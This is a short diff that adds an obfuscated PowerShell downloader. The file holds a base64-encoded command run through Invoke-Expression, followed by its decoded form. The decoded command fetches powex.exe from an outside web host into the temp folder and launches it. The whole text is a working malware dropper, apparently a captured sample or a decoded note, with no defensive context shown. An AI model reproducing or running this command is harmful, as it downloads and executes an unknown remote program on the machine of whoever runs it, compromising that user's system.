@@ -1,0 +1,7 @@
+iex([systeM.texT.EnCoDING]::UTF8.GetstRING([sYstem.cOnVErT]::froMBase64strIng('CihOZXctT2JqZWN0IFN5c3RlTS5OZVQud2VCY2xpZW5UKS5kT1dubG9BREZpbGUoJ2h0dHA6Ly9sYWJpZC5jb20ubXkvcG93ZXIvcG93ZXguZXhlJywiJGVOVjpURU1QXHBvd2V4LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZU5WOlRFTVBccG93ZXguZXhlIikKCg==')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SysteM.NeT.weBclienT).dOWnloADFile('http://labid.com.my/power/powex.exe',"$eNV:TEMP\powex.exe");Start-Process ("$eNV:TEMP\powex.exe")
+
